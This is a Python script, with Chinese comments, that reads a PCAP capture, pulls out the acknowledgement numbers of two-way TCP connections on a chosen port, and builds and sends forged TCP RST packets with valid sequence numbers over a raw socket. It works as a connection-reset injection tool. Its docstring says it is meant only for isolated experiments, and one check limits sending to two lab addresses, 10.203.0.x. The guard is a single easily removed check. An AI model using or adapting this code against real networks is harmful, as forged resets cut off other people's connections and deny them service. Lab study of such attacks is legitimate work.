"""仅供隔离实验使用：按抓包中的接收确认号构造合法序号的 TCP RST。"""
from pathlib import Path
import socket
import struct
import sys


def reset_targets(path, port):
    data = Path(path).read_bytes()
    endian = "<" if data[:4] in (b"\xd4\xc3\xb2\xa1", b"\x4d\x3c\xb2\xa1") else ">"
    if len(data) < 24 or struct.unpack(endian + "I", data[20:24])[0] != 1:
        raise ValueError("需要 Ethernet 类型 PCAP")
    cursor, acknowledgements, connections = 24, {}, set()
    while cursor + 16 <= len(data):
        length = struct.unpack(endian + "IIII", data[cursor:cursor+16])[2]
        frame = data[cursor+16:cursor+16+length]
        cursor += 16 + length
        if len(frame) != length or len(frame) < 54 or frame[12:14] != b"\x08\x00":
            continue
        tcp = 14 + (frame[14] & 15) * 4
        if frame[23] != 6 or len(frame) < tcp + 20:
            continue
        source, dest = socket.inet_ntoa(frame[26:30]), socket.inet_ntoa(frame[30:34])
        sport, dport, _, ack = struct.unpack("!HHII", frame[tcp:tcp+12])
        flow = (source, sport, dest, dport)
        if frame[tcp+13] & 16:
            acknowledgements[(dest, dport, source, sport)] = ack
        if dport == port:
            connections.add(flow)
    result = []
    for flow in sorted(connections):
        reverse = (flow[2], flow[3], flow[0], flow[1])
        if flow in acknowledgements and reverse in acknowledgements:
            result.extend([(*reverse, acknowledgements[reverse]), (*flow, acknowledgements[flow])])
    if not result:
        raise RuntimeError("没有找到可复核的双向 TCP 连接")
    return result


def checksum(data):
    if len(data) % 2:
        data += b"\0"
    value = sum(struct.unpack("!" + "H" * (len(data)//2), data))
    while value >> 16:
        value = (value & 65535) + (value >> 16)
    return (~value) & 65535


def send(source, sport, dest, dport, seq):
    # 固定使用实验网段，避免该辅助脚本误用于宿主机连接。
    if source not in ("10.203.0.1", "10.203.0.2") or dest not in ("10.203.0.1", "10.203.0.2"):
        raise ValueError("拒绝非实验地址")
    src, dst = socket.inet_aton(source), socket.inet_aton(dest)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 5 << 4, 4, 0, 0, 0)
    pseudo = src + dst + struct.pack("!BBH", 0, 6, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", checksum(pseudo + tcp)) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 0, 0, 64, 6, 0, src, dst)
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as sock:
        sock.sendto(ip + tcp, (dest, 0))


if __name__ == "__main__":
    send(sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]), int(sys.argv[5]))
